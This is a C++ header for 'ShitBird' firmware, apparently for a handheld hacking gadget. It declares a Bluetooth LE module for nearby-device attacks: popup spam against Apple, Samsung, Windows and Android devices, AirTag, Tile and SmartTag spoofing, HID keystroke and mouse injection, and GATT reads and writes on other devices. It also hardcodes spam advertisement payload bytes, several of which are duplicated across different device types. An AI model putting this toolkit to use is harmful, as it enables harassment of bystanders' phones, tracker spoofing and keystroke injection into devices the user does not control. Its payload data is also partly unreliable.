/**
 * ShitBird Firmware - BLE Module
 * Comprehensive BLE scanning, attacks, and analysis
 */

#ifndef SHITBIRD_BLE_MODULE_H
#define SHITBIRD_BLE_MODULE_H

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <vector>
#include <map>
#include "config.h"

// BLE Attack Types
enum class BLEAttackType {
    NONE,
    APPLE_SPAM,           // Apple device popup spam
    SAMSUNG_SPAM,         // Samsung watch/buds spam
    WINDOWS_SWIFT_PAIR,   // Windows Swift Pair spam
    GOOGLE_FAST_PAIR,     // Google/Android Fast Pair spam
    AIRTAG_SPOOF,         // AirTag spoofing
    TILE_SPOOF,           // Tile tracker spoof
    SMARTTAG_SPOOF,       // Samsung SmartTag spoof
    BLE_KEYBOARD,         // BLE HID keyboard
    BLE_MOUSE,            // BLE HID mouse
    ALL_SPAM,             // All spam types combined
    CUSTOM                // Custom advertisement
};

// Discovered BLE Device
struct BLEDeviceInfo {
    String address;
    String name;
    int rssi;
    bool isConnectable;
    bool hasName;
    uint16_t appearance;
    std::vector<String> serviceUUIDs;
    std::map<uint16_t, std::vector<uint8_t>> manufacturerData;
    uint32_t lastSeen;
    uint8_t addressType;

    // Identified device type
    String deviceType;
    bool isApple;
    bool isSamsung;
    bool isGoogle;
    bool isMicrosoft;
    bool isTracker;  // AirTag, Tile, etc.
};

// GATT Service Info
struct GATTServiceInfo {
    String uuid;
    String name;
    std::vector<String> characteristics;
};

// BLE Packet for logging
struct BLEPacket {
    uint32_t timestamp;
    String address;
    int8_t rssi;
    uint8_t type;
    std::vector<uint8_t> data;
};

class BLEModule {
public:
    static void init();
    static void update();
    static void deinit();

    // Scanning
    static void startScan(uint32_t duration = 0);  // 0 = continuous
    static void stopScan();
    static bool isScanning();
    static std::vector<BLEDeviceInfo>& getDevices();
    static void clearDevices();
    static BLEDeviceInfo* getDevice(const String& address);

    // GATT Operations
    static bool connect(const String& address);
    static void disconnect();
    static bool isConnected();
    static std::vector<GATTServiceInfo> enumerateServices();
    static std::vector<uint8_t> readCharacteristic(const String& serviceUUID, const String& charUUID);
    static bool writeCharacteristic(const String& serviceUUID, const String& charUUID, const std::vector<uint8_t>& data);

    // Spam Attacks
    static void startSpam(BLEAttackType type);
    static void stopSpam();
    static bool isSpamming();
    static BLEAttackType getCurrentAttack();

    // AirTag Operations
    static void startAirtagSniff();
    static void stopAirtagSniff();
    static void spoofAirtag(const uint8_t* payload, size_t len);
    static std::vector<BLEDeviceInfo>& getAirtagList();

    // HID Operations
    static void initHID();
    static void sendKeyboard(uint8_t key, uint8_t modifier = 0);
    static void sendKeyboardString(const String& str);
    static void sendMouseMove(int8_t x, int8_t y);
    static void sendMouseClick(uint8_t button);
    static void sendMouseScroll(int8_t delta);

    // Packet capture
    static void startCapture();
    static void stopCapture();
    static bool isCapturing();
    static std::vector<BLEPacket>& getCapturedPackets();
    static bool exportPackets(const char* filename);

    // Menu integration
    static void buildMenu(void* menuScreen);

private:
    static bool initialized;
    static bool scanning;
    static bool spamming;
    static bool capturing;
    static bool connected;
    static BLEAttackType currentAttack;

    static std::vector<BLEDeviceInfo> devices;
    static std::vector<BLEDeviceInfo> airtags;
    static std::vector<BLEPacket> capturedPackets;

    static NimBLEClient* pClient;
    static NimBLEAdvertising* pAdvertising;
    static NimBLEScan* pScan;

    static TaskHandle_t spamTaskHandle;
    static TaskHandle_t scanTaskHandle;

    // Spam payloads
    static void spamTask(void* param);
    static void sendAppleSpam();
    static void sendSamsungSpam();
    static void sendSwiftPairSpam();
    static void sendGoogleFastPairSpam();
    static void sendAirtagSpam();
    static void sendAllSpam();

    // Device identification
    static void identifyDevice(BLEDeviceInfo& device);
    static String getDeviceTypeName(const BLEDeviceInfo& device);

    // Scan callback
    class ScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
    public:
        void onResult(NimBLEAdvertisedDevice* device) override;
    };

    static ScanCallbacks scanCallbacks;
    static void onScanComplete(NimBLEScanResults results);
};

// ============================================================================
// BLE Spam Payloads
// ============================================================================

// Apple Proximity Pairing Messages
namespace AppleSpam {
    // Device types
    const uint8_t AIRPODS[] = {0x07, 0x19, 0x01, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};
    const uint8_t AIRPODS_PRO[] = {0x07, 0x19, 0x01, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};
    const uint8_t AIRTAG[] = {0x12, 0x19, 0x10, 0x07, 0x00};
    const uint8_t APPLE_TV[] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};
    const uint8_t HOMEPOD[] = {0x07, 0x19, 0x01, 0x06, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};

    // Continuity types
    const uint8_t TYPE_AIRDROP = 0x05;
    const uint8_t TYPE_PROXIMITY = 0x07;
    const uint8_t TYPE_AIRPLAY = 0x09;
    const uint8_t TYPE_HANDOFF = 0x0C;
    const uint8_t TYPE_WIFI_SETTINGS = 0x0D;
    const uint8_t TYPE_NEARBY_ACTION = 0x0F;
    const uint8_t TYPE_NEARBY_INFO = 0x10;
}

// Samsung BLE Spam
namespace SamsungSpam {
    const uint8_t GALAXY_WATCH[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
    const uint8_t GALAXY_BUDS[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
    const uint8_t SMARTTAG[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
}

// Windows Swift Pair
namespace SwiftPairSpam {
    const uint8_t PAYLOAD[] = {0x06, 0x00, 0x03, 0x00, 0x80};
    const uint16_t COMPANY_ID = 0x0006;  // Microsoft
}

// Google Fast Pair
namespace GoogleFastPairSpam {
    const uint16_t COMPANY_ID = 0x00E0;  // Google
    // Model IDs for various devices
    const uint32_t PIXEL_BUDS = 0x000000;
    const uint32_t BOSE_QC35 = 0x0000F0;
}

#endif // SHITBIRD_BLE_MODULE_H
